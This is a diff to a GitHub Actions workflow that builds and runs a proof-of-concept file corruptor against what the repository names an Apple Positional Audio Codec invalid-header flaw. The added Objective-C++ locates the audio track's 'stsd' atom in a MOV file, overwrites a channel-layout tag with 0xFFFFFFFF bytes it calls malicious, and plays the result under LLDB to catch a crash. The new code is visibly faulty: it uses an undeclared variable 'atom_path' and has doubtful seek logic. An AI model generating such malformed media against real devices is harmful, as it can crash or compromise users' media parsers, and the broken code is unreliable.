@@ -19,40 +19,147 @@ jobs:
       - name: Navigate to working directory
         run: cd AppleTest2/apple-positional-audio-codec-invalid-header-main && ls -l
 
-      # This script is a simple utility to corrupt a file at a specific offset.
-      - name: Patch encodeme.mm to be a Simple File Corruptor
+      # Updated: This script is now a self-contained parser and corruptor.
+      - name: Patch encodeme.mm to be an Intelligent Corruptor
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Patching encodeme.mm to be a simple corruption utility..."
+          echo "Patching encodeme.mm to be an intelligent, self-contained corruptor..."
           cat > encodeme.mm << 'EOF'
           #import <Foundation/Foundation.h>
           #include <stdio.h>
-          #include <stdlib.h>
+          #include <string.h>
+          #include <sys/types.h>
+
+          // Helper function to read a 32-bit big-endian integer from a file
+          uint32_t read_uint32_be(FILE *f) {
+              unsigned char bytes[4];
+              if (fread(bytes, 1, 4, f) != 4) return 0;
+              return ((uint32_t)bytes[0] << 24) | ((uint32_t)bytes[1] << 16) | ((uint32_t)bytes[2] << 8) | bytes[3];
+          }
+          
+          // Helper function to compare four-character codes
+          bool compare_fourcc(const char* a, const char* b) {
+              return strncmp(a, b, 4) == 0;
+          }
+
+          // Recursive function to find the offset of a nested atom
+          long find_atom_offset(FILE *f, const char* path) {
+              char target_name[5] = {0};
+              const char* next_path = NULL;
+              const char* separator = strchr(path, '/');
+              if (separator) {
+                  strncpy(target_name, path, separator - atom_path);
+                  next_path = separator + 1;
+              } else {
+                  strncpy(target_name, path, 4);
+              }
+
+              long parent_start_offset = ftell(f);
+              // We don't need the whole file size, just the parent's size
+              fseek(f, -8, SEEK_CUR); // Go back to read parent size
+              long parent_size = read_uint32_be(f);
+              fseek(f, 8, SEEK_CUR); // Go back to where we started
+
+              long current_pos = parent_start_offset;
+              while (current_pos < parent_start_offset + parent_size - 8) {
+                  fseek(f, current_pos, SEEK_SET);
+                  long atom_start = ftell(f);
+                  uint32_t atom_size = read_uint32_be(f);
+                  char atom_name[5] = {0};
+                  if (fread(atom_name, 1, 4, f) != 4) break;
+
+                  if (compare_fourcc(atom_name, target_name)) {
+                      if (next_path) {
+                          return find_atom_offset(f, next_path);
+                      } else {
+                          return atom_start;
+                      }
+                  }
+                  current_pos += atom_size;
+              }
+              return -1;
+          }
 
           int main(int argc, const char * argv[]) {
-              if (argc != 3) {
-                  fprintf(stderr, "Usage: %s <file_to_corrupt> <offset_to_corrupt>\n", argv[0]);
-                  return 1;
+              @autoreleasepool {
+                  time_t startTime = time(NULL);
+                  fprintf(stderr, "Starting file corruption at %s\n", ctime(&startTime));
+
+                  const char* baseName = "IMG_1027.mov";
+                  const char* pocName = "output_apac_poc.m4a";
+
+                  // Step 1: Copy the base file.
+                  NSError *error = nil;
+                  if (![[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithUTF8String:baseName]
+                                                               toPath:[NSString stringWithUTF8String:pocName] error:&error]) {
+                      fprintf(stderr, "Failed to copy base file: %s\n", [[error localizedDescription] UTF8String]);
+                      return 1;
+                  }
+                  fprintf(stderr, "Successfully copied base APAC file.\n");
+
+                  // Step 2: Open the file and find the 'stsd' atom within the audio track.
+                  FILE *file = fopen(pocName, "r+b");
+                  if (!file) {
+                      fprintf(stderr, "Failed to re-open file for corruption.\n");
+                      return 1;
+                  }
+                  
+                  // Find the main 'moov' atom
+                  fseek(file, 0, SEEK_SET);
+                  long moov_offset = find_atom_offset(file, "moov");
+                  if (moov_offset == -1) {
+                      fprintf(stderr, "Could not find 'moov' atom.\n"); return 1;
+                  }
+                  fseek(file, moov_offset + 8, SEEK_SET); // Enter moov
+
+                  // Iterate through 'trak' atoms to find the sound track
+                  long stsd_offset = -1;
+                  while(1) {
+                      long trak_offset = find_atom_offset(file, "trak");
+                      if(trak_offset == -1) break;
+                      fseek(file, trak_offset + 8, SEEK_SET); // Enter trak
+
+                      long mdia_offset = find_atom_offset(file, "mdia");
+                      if(mdia_offset == -1) continue;
+                      fseek(file, mdia_offset + 8, SEEK_SET); // Enter mdia
+
+                      long hdlr_offset = find_atom_offset(file, "hdlr");
+                      if(hdlr_offset == -1) continue;
+                      fseek(file, hdlr_offset + 16, SEEK_SET); // Seek to handler type in hdlr
+                      char handler_type[5] = {0};
+                      fread(handler_type, 1, 4, file);
+
+                      if(compare_fourcc(handler_type, "soun")) {
+                          // This is the audio track, now find stsd within it
+                          fseek(file, mdia_offset + 8, SEEK_SET); // Go back into mdia
+                          long minf_offset = find_atom_offset(file, "minf");
+                          fseek(file, minf_offset + 8, SEEK_SET);
+                          long stbl_offset = find_atom_offset(file, "stbl");
+                          fseek(file, stbl_offset + 8, SEEK_SET);
+                          stsd_offset = find_atom_offset(file, "stsd");
+                          break; // Found it
+                      }
+                  }
+
+                  if (stsd_offset == -1) {
+                      fprintf(stderr, "Could not find the audio track's 'stsd' atom.\n");
+                      fclose(file);
+                      return 1;
+                  }
+                  fprintf(stderr, "Found audio 'stsd' atom at offset: 0x%lx\n", stsd_offset);
+
+                  // PoC: Corrupt the channel layout tag inside the 'stsd' atom.
+                  long corruption_offset = stsd_offset + 72;
+                  fseek(file, corruption_offset, SEEK_SET);
+                  
+                  unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
+                  fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
+                  fclose(file);
+
+                  fprintf(stderr, "PoC: Manually corrupted data at offset 0x%lx in the APAC file.\n", corruption_offset);
+                  time_t endTime = time(NULL);
+                  fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
               }
-
-              const char* filePath = argv[1];
-              long offset = atol(argv[2]);
-
-              FILE *file = fopen(filePath, "r+b");
-              if (!file) {
-                  fprintf(stderr, "Failed to open file: %s\n", filePath);
-                  return 1;
-              }
-
-              fprintf(stderr, "Corrupting file at offset 0x%lx...\n", offset);
-              fseek(file, offset, SEEK_SET);
-              
-              // This is the malicious data that triggers the vulnerability
-              unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
-              fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
-              fclose(file);
-              
-              fprintf(stderr, "Corruption complete.\n");
               return 0;
           }
           EOF
@@ -68,84 +175,47 @@ jobs:
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
           echo "Compiling encodeme_corruptor..."
-          clang++ -g -fobjc-arc -framework Foundation encodeme.mm -o encodeme_corruptor
+          clang++ -g -fobjc-arc -framework Foundation -framework AudioToolbox encodeme.mm -o encodeme_corruptor
           if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi
 
-      # This new, combined step iterates through all 'stsd' atoms, corrupts each one, and tests it.
-      - name: Iterate, Corrupt, and Test All Audio Tracks
+      # This step now just runs the corruption utility.
+      - name: Corrupt APAC File
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          set -x 
+          ./encodeme_corruptor
+          echo "Malicious APAC PoC file generated."
+          ls -l output_apac_poc.m4a
           
-          echo "Installing Bento4 and jq to find the correct atom offset..."
-          brew install bento4 jq
+      # Launch the player directly under LLDB to catch any startup crashes.
+      - name: Launch Player Under LLDB to Catch Crash
+        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
+        run: |
+          PLAYER_LOG_FILE="player_debug_log.txt"
+          echo "--- Debugging Audio Player (afplay) with final PoC ---" > $PLAYER_LOG_FILE
+          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE
 
-          # Step 1: Use mp4dump on the original MOV file to create a JSON representation.
-          mp4dump --format json IMG_1027.mov > atom_dump.json
-          
-          # Step 2: Use jq to find all 'stsd' offsets from the JSON dump.
-          ALL_OFFSETS=$(jq -r '.. | objects | select(.name? == "stsd") | .file_offset' atom_dump.json)
+          echo "Creating LLDB script to launch and monitor afplay..."
+          cat > player_debug_script.lldb << 'EOF'
+          # Run the process. LLDB will automatically stop if a crash occurs.
+          run
+          # If a crash occurred, this will give us the full backtrace.
+          bt
+          quit
+          EOF
 
-          if [ -z "$ALL_OFFSETS" ]; then
-            echo "Could not find any 'stsd' atoms using jq. Aborting."
-            exit 1
-          fi
+          echo "Launching afplay under LLDB..." >> $PLAYER_LOG_FILE
+          lldb -s player_debug_script.lldb -- afplay output_apac_poc.m4a >> $PLAYER_LOG_FILE 2>&1 || true
 
-          echo "Found the following 'stsd' offsets to test:"
-          echo "$ALL_OFFSETS"
+          echo "✅ Player debug log created. Displaying contents:"
+          cat $PLAYER_LOG_FILE
 
-          # Step 3: Loop through each offset, create a unique corrupted file, and test it.
-          mkdir -p test_results
-          for OFFSET in $ALL_OFFSETS; do
-            echo "--- Testing corruption for stsd atom at offset ${OFFSET} ---"
-            
-            POC_FILE="output_poc_offset_${OFFSET}.mp4"
-            PLAYER_LOG_FILE="test_results/player_log_offset_${OFFSET}.txt"
-            
-            # Create a fresh copy for this iteration
-            cp IMG_1027.mov "$POC_FILE"
-            
-            # The channel layout tag is at a known position within the stsd atom.
-            CORRUPTION_OFFSET=$(( ${OFFSET} + 72 ))
-            echo "Calculated corruption offset: ${CORRUPTION_OFFSET}"
-            
-            # Run the C++ utility to perform the corruption.
-            ./encodeme_corruptor "$POC_FILE" $CORRUPTION_OFFSET
-            
-            echo "Launching player under LLDB for ${POC_FILE}..."
-            
-            # Create the lldb script for this iteration
-            cat > player_debug_script.lldb << 'EOF'
-            run
-            bt
-            quit
-            EOF
-            
-            # Run the test
-            lldb -s player_debug_script.lldb -- afplay "$POC_FILE" > "$PLAYER_LOG_FILE" 2>&1 || true
-            
-            # Check for crash by looking for lldb backtrace output
-            if grep -q "frame #0" "$PLAYER_LOG_FILE" && ! grep -q "stop reason = breakpoint" "$PLAYER_LOG_FILE" ; then
-              echo "✅✅✅ POTENTIAL CRASH DETECTED for offset ${OFFSET} ✅✅✅"
-              echo "Log file: ${PLAYER_LOG_FILE}"
-              # We will continue testing other offsets, but this is a strong signal.
-            else
-              echo "No crash detected for offset ${OFFSET}."
-            fi
-            
-            echo "--- Finished testing offset ${OFFSET} ---"
-          done
-
-          echo "All offsets tested."
-
-      # Upload all artifacts for analysis
+      # Upload all artifacts
       - name: Upload All Artifacts
         uses: actions/upload-artifact@v4
         with:
           name: debug-and-poc-artifacts
           path: |
-            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_poc_offset_*.mp4
-            AppleTest2/apple-positional-audio-codec-invalid-header-main/test_results/
-            AppleTest2/apple-positional-audio-codec-invalid-header-main/atom_dump.json
+            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.m4a
+            AppleTest2/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
           retention-days: 7
           if-no-files-found: error
